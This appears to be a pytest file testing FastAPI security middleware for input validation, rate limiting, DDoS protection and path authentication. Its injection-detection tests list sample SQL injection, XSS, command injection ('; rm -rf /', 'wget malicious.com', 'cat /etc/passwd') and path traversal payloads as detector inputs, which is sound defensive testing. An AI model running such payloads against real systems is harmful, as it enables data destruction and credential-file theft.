"""
Security Middleware Integration Tests

Tests to verify that all security middleware components work together correctly.
"""

import asyncio
import json
import time
from typing import Dict, Any
from unittest.mock import Mock, AsyncMock
import pytest

from fastapi import FastAPI, Request
from fastapi.testclient import TestClient

from .input_validation_middleware import InputValidationMiddleware, InputValidationRule
from .rate_limit_middleware import RateLimitMiddleware, RateLimitRule
from .ddos_protection_middleware import DDoSProtectionMiddleware
from .security_middleware import SecurityMiddleware
from .middleware_integration import SecurityMiddlewareStack, create_development_security_config


class TestSecurityMiddlewareIntegration:
    """Integration tests for security middleware stack"""
    
    def setup_method(self):
        """Setup test environment"""
        self.app = FastAPI()
        self.config = create_development_security_config()
        
        # Mock authentication components
        self.jwt_manager = Mock()
        self.auth_manager = Mock()
        self.authorization_manager = Mock()
        
        # Create security stack
        self.security_stack = SecurityMiddlewareStack(
            app=self.app,
            jwt_manager=self.jwt_manager,
            auth_manager=self.auth_manager,
            authorization_manager=self.authorization_manager,
            config=self.config
        )
    
    def test_middleware_stack_creation(self):
        """Test that middleware stack can be created successfully"""
        assert self.security_stack is not None
        assert self.security_stack.input_validator is not None
        assert self.security_stack.rate_limiter is not None
        assert self.security_stack.ddos_protection is not None
        assert self.security_stack.security_middleware is not None
    
    def test_middleware_configuration(self):
        """Test that middleware components are configured correctly"""
        # Test input validation configuration
        input_config = self.config.get("input_validation", {})
        assert self.security_stack.input_validator.enable_validation == input_config.get("enable_validation", True)
        
        # Test rate limiting configuration
        rate_config = self.config.get("rate_limiting", {})
        assert self.security_stack.rate_limiter.enable_rate_limit_headers == rate_config.get("enable_headers", True)
        
        # Test DDoS protection configuration
        ddos_config = self.config.get("ddos_protection", {})
        assert self.security_stack.ddos_protection.enable_protection == ddos_config.get("enable_protection", True)
    
    async def test_middleware_statistics(self):
        """Test that middleware statistics are collected correctly"""
        stats = self.security_stack.get_middleware_statistics()
        
        assert "security" in stats
        assert "rate_limiting" in stats
        assert "ddos_protection" in stats
        assert "input_validation" in stats
        
        # Check that each component has statistics
        assert "statistics" in stats["security"]
        assert "statistics" in stats["rate_limiting"]
        assert "statistics" in stats["ddos_protection"]
        assert "statistics" in stats["input_validation"]
    
    async def test_security_health_check(self):
        """Test security health check functionality"""
        health = await self.security_stack.security_health_check()
        
        assert "overall" in health
        assert "components" in health
        assert "alerts" in health
        assert "recommendations" in health
        
        # Health should be healthy by default
        assert health["overall"] in ["healthy", "warning", "critical", "error"]


class TestInputValidationMiddleware:
    """Tests for input validation middleware"""
    
    def setup_method(self):
        """Setup test environment"""
        self.middleware = InputValidationMiddleware(
            app=FastAPI(),
            config={
                "enable_validation": True,
                "strict_mode": False,
                "max_request_size": 1024,
                "max_json_depth": 5
            }
        )
    
    def test_sql_injection_detection(self):
        """Test SQL injection pattern detection"""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "UNION SELECT * FROM passwords",
            "admin'; DELETE FROM users WHERE 'a'='a"
        ]
        
        for malicious_input in malicious_inputs:
            assert self.middleware._detect_injection_attacks(malicious_input) == True
    
    def test_xss_detection(self):
        """Test XSS pattern detection"""
        malicious_inputs = [
            "<script>alert('XSS')</script>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>"
        ]
        
        for malicious_input in malicious_inputs:
            assert self.middleware._detect_injection_attacks(malicious_input) == True
    
    def test_command_injection_detection(self):
        """Test command injection pattern detection"""
        malicious_inputs = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget malicious.com",
            "`whoami`"
        ]
        
        for malicious_input in malicious_inputs:
            assert self.middleware._detect_injection_attacks(malicious_input) == True
    
    def test_path_traversal_detection(self):
        """Test path traversal pattern detection"""
        malicious_inputs = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        for malicious_input in malicious_inputs:
            assert self.middleware._detect_injection_attacks(malicious_input) == True
    
    def test_input_sanitization(self):
        """Test input sanitization functionality"""
        test_cases = [
            ("<script>alert('test')</script>", "&lt;script&gt;alert(&#x27;test&#x27;)&lt;/script&gt;"),
            ("test & example", "test &amp; example"),
            ("test\x00null", "testnull")
        ]
        
        for input_text, expected in test_cases:
            sanitized = self.middleware._sanitize_input(input_text)
            # Check that dangerous content is escaped
            assert "<script>" not in sanitized
            assert "&" not in sanitized or "&amp;" in sanitized or "&lt;" in sanitized
            assert "\x00" not in sanitized
    
    def test_json_depth_validation(self):
        """Test JSON depth validation"""
        # Create deeply nested JSON
        deep_json = {"level1": {"level2": {"level3": {"level4": {"level5": {"level6": "deep"}}}}}}
        
        depth = self.middleware._get_json_depth(deep_json)
        assert depth == 6
        
        # Test validation with max depth of 5
        errors = self.middleware._validate_json_values(deep_json)
        # Should not have depth-related errors in value validation
        assert len([e for e in errors if "depth" in e.lower()]) == 0


class TestRateLimitMiddleware:
    """Tests for rate limiting middleware"""
    
    def setup_method(self):
        """Setup test environment"""
        self.middleware = RateLimitMiddleware(
            app=FastAPI(),
            redis_url=None,  # Use in-memory storage
            config={
                "enable_headers": True,
                "default_rate_limit": {"requests": 10, "window": 60}
            }
        )
    
    def test_rate_limit_rules_creation(self):
        """Test rate limit rules are created correctly"""
        assert len(self.middleware.rules) > 0
        
        # Check for specific rules
        rule_names = [rule.name for rule in self.middleware.rules]
        assert "global_ip_limit" in rule_names
        assert "login_limit" in rule_names
        assert "search_limit" in rule_names
    
    def test_ip_extraction(self):
        """Test IP address extraction from requests"""
        # Mock request with different IP headers
        mock_request = Mock()
        mock_request.headers = {
            "x-forwarded-for": "192.168.1.1, 10.0.0.1",
            "x-real-ip": "192.168.1.2"
        }
        mock_request.client = Mock()
        mock_request.client.host = "192.168.1.3"
        
        # Should return the first IP from x-forwarded-for
        ip = self.middleware._get_client_ip(mock_request)
        assert ip == "192.168.1.1"
    
    async def test_sliding_window_rate_limiter(self):
        """Test sliding window rate limiter functionality"""
        rate_limiter = self.middleware.rate_limiter
        
        # Test rate limiting
        key = "test_key"
        limit = 5
        window = 60
        
        # Should allow requests up to limit
        for i in range(limit):
            allowed, metadata = await rate_limiter.is_allowed(key, limit, window)
            assert allowed == True
            assert metadata["remaining"] >= 0
        
        # Next request should be rate limited
        allowed, metadata = await rate_limiter.is_allowed(key, limit, window)
        assert allowed == False
        assert metadata["retry_after"] > 0


class TestDDoSProtectionMiddleware:
    """Tests for DDoS protection middleware"""
    
    def setup_method(self):
        """Setup test environment"""
        self.middleware = DDoSProtectionMiddleware(
            app=FastAPI(),
            config={
                "enable_protection": True,
                "detection_sensitivity": "medium",
                "max_requests_per_second": 10,
                "max_requests_per_ip_per_minute": 30,
                "suspicious_score_threshold": 0.7
            }
        )
    
    def test_traffic_metrics_initialization(self):
        """Test traffic metrics are initialized correctly"""
        assert self.middleware.traffic_metrics is not None
        assert hasattr(self.middleware.traffic_metrics, 'requests_per_second')
        assert hasattr(self.middleware.traffic_metrics, 'requests_per_minute')
    
    async def test_suspicious_request_detection(self):
        """Test suspicious request pattern detection"""
        # Mock request
        mock_request = Mock()
        mock_request.url = Mock()
        mock_request.url.path = "/api/test"
        mock_request.headers = {"user-agent": "bot"}
        
        client_ip = "192.168.1.100"
        
        # Simulate multiple requests to trigger suspicion
        for i in range(50):
            suspicion_score = await self.middleware._analyze_request(mock_request, client_ip)
        
        # Should detect suspicious behavior after many requests
        final_score = await self.middleware._analyze_request(mock_request, client_ip)
        assert final_score > 0.5  # Should be suspicious
    
    async def test_ip_blocking(self):
        """Test IP blocking functionality"""
        test_ip = "192.168.1.200"
        
        # Initially should not be blocked
        assert await self.middleware._is_ip_blocked(test_ip) == False
        
        # Block the IP
        await self.middleware._block_ip(test_ip, duration_seconds=60)
        
        # Should now be blocked
        assert await self.middleware._is_ip_blocked(test_ip) == True
        
        # Unblock the IP
        await self.middleware.unblock_ip(test_ip)
        
        # Should no longer be blocked
        assert await self.middleware._is_ip_blocked(test_ip) == False
    
    async def test_threat_alert_creation(self):
        """Test threat alert creation"""
        initial_alerts = len(self.middleware.threat_alerts)
        
        await self.middleware._create_threat_alert(
            threat_type="test_threat",
            severity="high",
            description="Test threat description",
            source_ips=["192.168.1.1"],
            metrics={"test_metric": 100}
        )
        
        # Should have one more alert
        assert len(self.middleware.threat_alerts) == initial_alerts + 1
        
        # Check alert details
        latest_alert = self.middleware.threat_alerts[-1]
        assert latest_alert.threat_type == "test_threat"
        assert latest_alert.severity == "high"
        assert "192.168.1.1" in latest_alert.source_ips


class TestSecurityMiddleware:
    """Tests for main security middleware"""
    
    def setup_method(self):
        """Setup test environment"""
        # Mock authentication components
        self.jwt_manager = Mock()
        self.auth_manager = Mock()
        self.authorization_manager = Mock()
        
        self.middleware = SecurityMiddleware(
            app=FastAPI(),
            jwt_manager=self.jwt_manager,
            auth_manager=self.auth_manager,
            authorization_manager=self.authorization_manager,
            config={
                "require_auth_paths": ["/api/v1/protected"],
                "public_paths": ["/", "/health"],
                "admin_paths": ["/api/v1/admin"]
            }
        )
    
    def test_path_authentication_requirements(self):
        """Test path authentication requirement logic"""
        # Public paths should not require auth
        assert self.middleware._requires_authentication("/") == False
        assert self.middleware._requires_authentication("/health") == False
        
        # Protected paths should require auth
        assert self.middleware._requires_authentication("/api/v1/protected") == True
        
        # Default API paths should require auth
        assert self.middleware._requires_authentication("/api/v1/other") == True
    
    def test_request_id_generation(self):
        """Test request ID generation"""
        request_id1 = self.middleware._generate_request_id()
        request_id2 = self.middleware._generate_request_id()
        
        # Should generate unique IDs
        assert request_id1 != request_id2
        assert len(request_id1) == 8  # Should be 8 characters
        assert len(request_id2) == 8
    
    def test_client_ip_extraction(self):
        """Test client IP extraction"""
        # Mock request with forwarded header
        mock_request = Mock()
        mock_request.headers = {"x-forwarded-for": "192.168.1.1, 10.0.0.1"}
        mock_request.client = Mock()
        mock_request.client.host = "127.0.0.1"
        
        ip = self.middleware._get_client_ip(mock_request)
        assert ip == "192.168.1.1"


def run_integration_tests():
    """Run all integration tests"""
    print("Running Security Middleware Integration Tests...")
    
    # Test input validation
    print("\n1. Testing Input Validation Middleware...")
    input_test = TestInputValidationMiddleware()
    input_test.setup_method()
    input_test.test_sql_injection_detection()
    input_test.test_xss_detection()
    input_test.test_command_injection_detection()
    input_test.test_path_traversal_detection()
    input_test.test_input_sanitization()
    input_test.test_json_depth_validation()
    print("   ✓ Input validation tests passed")
    
    # Test rate limiting
    print("\n2. Testing Rate Limiting Middleware...")
    rate_test = TestRateLimitMiddleware()
    rate_test.setup_method()
    rate_test.test_rate_limit_rules_creation()
    rate_test.test_ip_extraction()
    
    # Run async test
    async def run_rate_limit_async():
        await rate_test.test_sliding_window_rate_limiter()
    
    asyncio.run(run_rate_limit_async())
    print("   ✓ Rate limiting tests passed")
    
    # Test DDoS protection
    print("\n3. Testing DDoS Protection Middleware...")
    ddos_test = TestDDoSProtectionMiddleware()
    ddos_test.setup_method()
    ddos_test.test_traffic_metrics_initialization()
    
    # Run async tests
    async def run_ddos_async():
        await ddos_test.test_suspicious_request_detection()
        await ddos_test.test_ip_blocking()
        await ddos_test.test_threat_alert_creation()
    
    asyncio.run(run_ddos_async())
    print("   ✓ DDoS protection tests passed")
    
    # Test security middleware
    print("\n4. Testing Security Middleware...")
    security_test = TestSecurityMiddleware()
    security_test.setup_method()
    security_test.test_path_authentication_requirements()
    security_test.test_request_id_generation()
    security_test.test_client_ip_extraction()
    print("   ✓ Security middleware tests passed")
    
    # Test integration
    print("\n5. Testing Middleware Integration...")
    integration_test = TestSecurityMiddlewareIntegration()
    integration_test.setup_method()
    integration_test.test_middleware_stack_creation()
    integration_test.test_middleware_configuration()
    
    # Run async tests
    async def run_integration_async():
        await integration_test.test_middleware_statistics()
        await integration_test.test_security_health_check()
    
    asyncio.run(run_integration_async())
    print("   ✓ Integration tests passed")
    
    print("\n🎉 All security middleware tests passed successfully!")
    print("\nSecurity middleware components are working correctly and are ready for production use.")


if __name__ == "__main__":
    run_integration_tests()